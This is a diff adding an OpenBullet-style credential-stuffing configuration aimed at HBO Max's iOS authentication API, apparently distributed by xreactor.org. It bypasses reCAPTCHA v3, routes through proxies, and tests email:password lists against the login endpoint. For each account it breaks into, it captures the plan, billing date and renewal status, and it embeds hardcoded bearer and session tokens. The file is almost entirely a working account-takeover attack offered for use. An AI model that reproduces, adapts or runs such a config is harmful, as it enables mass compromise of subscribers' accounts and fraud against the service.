@@ -1,0 +1,146 @@
+[SETTINGS]
+{
+  "Name": "hbomax ios api | xreactor.org",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-23T22:42:51.8854114+02:00",
+  "AdditionalInfo": "download other configs :xreactor.org | @uzzzul",
+  "RequiredPlugins": [
+    "RecaptchaV3Bypass"
+  ],
+  "Author": "Telegram:@xreactor_team | xreactor.org | @uzzzul",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "hbomax ios api",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "1" 
+
+FUNCTION GenerateGUID -> VAR "2" 
+
+RecaptchaV3Bypass "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ&co=aHR0cHM6Ly9wbGF5Lmhib21heC5jb206NDQz&hl=en&v=TDBxTlSsKAUm3tSIa0fwIqNu&size=invisible&cb=ej4cncr952pa" "" "https://www.google.com/recaptcha/enterprise/reload?k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ" -> VAR "3" 
+  
+
+#LOGIN REQUEST POST "https://oauth-us.api.hbo.com/auth/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: oauth-us.api.hbo.com" 
+  HEADER "X-Hbo-Device-Name: ios" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aW1lc3RhbXAiOjE2NDI4NjI5NzAyNTgsImV4cGlyYXRpb24iOjE2NDI4NzczNzAyNTgsInBheWxvYWQiOnsiaGlzdG9yaWNhbE1ldGFkYXRhIjp7Im9yaWdpbmFsSXNzdWVkVGltZXN0YW1wIjoxNjQyODYyOTcwMjU4LCJvcmlnaW5hbEdyYW50VHlwZSI6ImNsaWVudF9jcmVkZW50aWFscyIsIm9yaWdpbmFsVmVyc2lvbiI6Mn0sImV4cGlyYXRpb25NZXRhZGF0YSI6eyJhdXRoelRpbWVvdXRNcyI6MTQ0MDAwMDAsImF1dGhuVGltZW91dE1zIjozMTEwNDAwMDAwMCwiYXV0aHpFeHBpcmF0aW9uVXRjIjoxNjQyODc3MzcwMjU4LCJhdXRobkV4cGlyYXRpb25VdGMiOjE2NzM5NjY5NzAyNTh9LCJ0b2tlblByb3BlcnR5RGF0YSI6eyJjbGllbnRJZCI6IjI0ZmE1ZTM2LTNkYzQtNGVkMC1iM2YxLTI5OTA5MjcxYjYzZCIsImRldmljZVNlcmlhbE51bWJlciI6Ijk5ZWRiZjhmLTE3NmYtNGFiOC1hYzA5LTU0OGY0NjI0ZjNkNyIsInBlcm1pc3Npb25zIjpbNSw3LDldLCJjb3VudHJ5Q29kZSI6IlVTIiwicGxhdGZvcm1UZW5hbnRDb2RlIjoiaGJvRGlyZWN0IiwicHJvZHVjdENvZGUiOiJoYm9NYXgiLCJkZXZpY2VDb2RlIjoiaXBob25lIiwicGxhdGZvcm1UeXBlIjoibW9iaWxlIiwic2VydmljZUNvZGUiOiJIQk9fTUFYIiwiY2xpZW50RGV2aWNlRGF0YSI6eyJwYXltZW50UHJvdmlkZXJDb2RlIjoiYXBwbGUifX0sImN1cnJlbnRNZXRhZGF0YSI6eyJlbnZpcm9ubWVudCI6InByb2R1Y3Rpb24iLCJtYXJrZXQiOiJ1cyIsInZlcnNpb24iOjIsIm5vbmNlIjoiZGEzZmQ0MmYtZDg4Mi00MWYwLWI5YzUtNjg5ZDc0MmI5NTY4IiwiaXNzdWVkVGltZXN0YW1wIjoxNjQyODYyOTcwMjU4fSwicGVybWlzc2lvbnMiOls1LDcsOV0sInRva2VuX3R5cGUiOiJhY2Nlc3MiLCJlbnZpcm9ubWVudCI6InByb2R1Y3Rpb24iLCJtYXJrZXQiOiJ1cyIsInZlcnNpb24iOjJ9fQ.sHuzgo4bhf72RWEK6hnF0KFw3_8EuWYTzPawIOevfwU" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.63.0.51 ios (IPHONE/14.7.1)" 
+  HEADER "X-B3-TraceId: <1>-<2>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-RecaptchaToken: <3>" 
+  HEADER "Content-Length: 155" 
+  HEADER "User-Agent: HBOMAX/50.63.0.51 CFNetwork/1240.0.4 Darwin/20.6.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-hbo-headwaiter: entitlements:eyJpIjoiZ2F0ZXdheUAwLjAuMjA5IiwidiI6MSwicyI6NDIsImFsZyI6ImRpciIsImVuYyI6IkEyNTZHQ00ifQ..ka0x5xr1LAvtLQzC.dve-MA0SqfeE4ofUfUF-ZrhRgXpdJGQBNSIpkTOujuntdTMAMuR-iwx60SQwmLoXjiWN8vnm4g32nWxbJFE0O8ud7lzvHioGJgJsowy55C-9435sKR5ORrOrZLogCytiZ4OxuBrwINaahp6AXqjb8WJDJYbMVe2ryiIL-zuqK8IRGC9QAzHZjJM4mlibfTDcee8oYIn__SgxkOyT2TF4r2BJoSM3A1hucWF64Qe0HUFDpEpOdd-ts8pWFwoLC9Ver7gvsFeRT477Q-B6lNi5XZDhxKxLQ3TU6AZ2W3K_Q_xDEjrWgl8I7s3uFiGVaj2YqYfASCylW0nVhaWD0yFq2A2YuVanP_tWawFDK9ZD3UDu-tMX8yUk9TW8PB5kWkDm_cnGwQOp6Dv1qjTAflyLiXMYMSAUysifFNp4Knjrg-yZf1L8T-i4MPk9JUYCZAvrwKgnxMGXLR0R7diRIw.90ylqv3lDpAaqxAJrfvASQ,globalization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImkiOiJnYXRld2F5QDAuMC4yMDkiLCJ2IjoxLCJzIjo0Mn0.eyJkIjp7InVpTGFuZ3VhZ2UiOiJlbi1VUyIsImZvcm1hdCI6ImVuLVVTIiwiYWx0ZXJuYXRlVWlMYW5ndWFnZSI6ImVuLVVTIiwicHJlZmVycmVkTGFuZ3VhZ2VzIjpbImVuLVVTIl19LCJpYXQiOjE2NDI4NjI5NzF9.2yQP8gtryfN0ZcycoRaD-UStphWnq6bkApYN1I-RUUg,privacy:eyJpIjoiZ2F0ZXdheUAwLjAuMjA5IiwidiI6MSwicyI6NDIsImFsZyI6ImRpciIsImVuYyI6IkEyNTZHQ00ifQ..MUXOgPfmSTmKw3Hh.8QH0GN6Fj5t4S97ebnddcv-05zAPPU0z3rwm7URqadhXdLKYuZeENYyk1eA_4mD2BmNhT88jWoBLhFdPNC6ZS5eR2QRTDasrTxqRsxyMTn8emjn4TMAyjaGkZByXnAgLtZzd2ZXsGGoHGns9YRPp3AYBwxFZcB3FhOn_RN52IEU1q6gHNf0HhJ2R2Ftk85P3mbf8jA.XntfPHn4piqaOe5imEHYmw,profile:eyJpIjoiZ2F0ZXdheUAwLjAuMjA5IiwidiI6MSwicyI6NDIsImFsZyI6ImRpciIsImVuYyI6IkEyNTZHQ00ifQ..uM3M9anIOWwDryeH.kIOIBEbQ5UiZQj_ATcQYNwH2rotYy_aGJYTwLNlvoicDJ5P7guuy-I96_pbAzlfcXN6vO1Qnd29l55RJveAvyCGlH9pvOMjtN-bYd-l4gIz7WpWzy0FiywGWOjTqVZMXwXhDuYm9DBspkhMaON6mrg.EobLTG7TKnRrtPZs2e-J7Q,telemetry:eyJpIjoiZ2F0ZXdheUAwLjAuMjA5IiwidiI6MSwicyI6NDIsImFsZyI6ImRpciIsImVuYyI6IkEyNTZHQ00ifQ..SGofsswSxPC5K2eK.dXrD_Oq6An6J2Vydf3thZ-FRZz-ehJGJlukT9Se0KLGulJo1pf9zpKior7g4rVJz1d7qGenld_HJFPwui8nDO72hWZy5WIS7obn0aqC6Uj4hFEnbzCMtIAO6KHCq6ICIbFHLlYk_VS6PgSZ-eYJrvYpuOvFwOU29Fbvz.dj13RikWNDNWInhtmaadlQ" 
+  HEADER "X-Hbo-Device-Os-Version: 14.7.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"statusCode\":401," 
+    KEY "The email address or password is incorrect. Please try again." 
+    KEY "invalid_credentials" 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+    KEY "\"isUserLoggedIn\":true}" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "tk" 
+
+REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <tk>" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 2 Build/PPR1.180610.009)" 
+  HEADER "X-B3-TraceId: <1>-<2>" 
+  HEADER "x-hbo-brownie: sessionContext=We3IsMl7BGvmXv%2BcaTWp1Q%3D%3D.JQ05x9F0XJN6%2B%2BwnJvxbJOyfj5bRyI4OmsalZsQrDKQxeHjob5ewp82k4OhQ9z4cwTDPivniC2OIl70TVAUh7iIjdyDS145vHeFgi13FLUIrSo7VW3xtqr5w3h3gTDqxx6nmEzjLRgGZKef7iQu1tQ%3D%3D" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.55.0.182 android/50.55.0.182 (Pixel 2/9)" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "X-Hbo-Device-Os-Version: 9" 
+
+PARSE "<SOURCE>" LR "nPrice: [" "](strong" CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "Billing Date: [" "T" CreateEmpty=FALSE -> VAR "ex" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<ex>" -> VAR "ut" 
+
+FUNCTION UnixTimeToDate "dd-MM-yyyy" "<ut>" -> CAP "Expiry Date" 
+
+PARSE "<SOURCE>" JSON "autoRenew" CreateEmpty=FALSE -> CAP "Auto-Renew" 
+
+ELSE
+
+PARSE "<SOURCE>" LR "\"billingInformationMessage\": \"" "." CreateEmpty=FALSE -> CAP "info payment" 
+
+ENDIF
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Your subscription expired on " 
+    KEY "<info payment>" Contains "expired" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You’re not subscribed to HBO Max" 
+    KEY "<SOURCE>" EqualTo "{}" 
+
+FUNCTION Constant "@uzzzul" -> CAP "Config by" 
+
